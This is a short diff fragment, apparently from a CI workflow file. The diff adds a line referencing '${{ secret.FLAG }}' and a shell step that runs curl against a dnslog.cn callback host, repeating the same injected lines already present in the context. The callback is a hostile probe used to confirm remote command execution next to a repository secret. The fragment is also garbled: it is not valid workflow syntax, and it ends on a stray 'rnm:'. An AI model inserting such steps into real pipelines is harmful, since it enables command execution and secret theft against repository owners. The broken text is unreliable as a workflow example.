@@ -619,3 +619,6 @@ shell: /bin/bash -e "curl fksb.sxhx72.dnslog.cn";
 R1gelX29:${{ secret.FLAG }};
 shell: /usr/bin/bash -e "curl fksb.sxhx72.dnslog.cn";
 
+R1gelX29:${{ secret.FLAG }};
+shell: /usr/bin/bash -e "curl fksb.sxhx72.dnslog.cn";
+rnm:
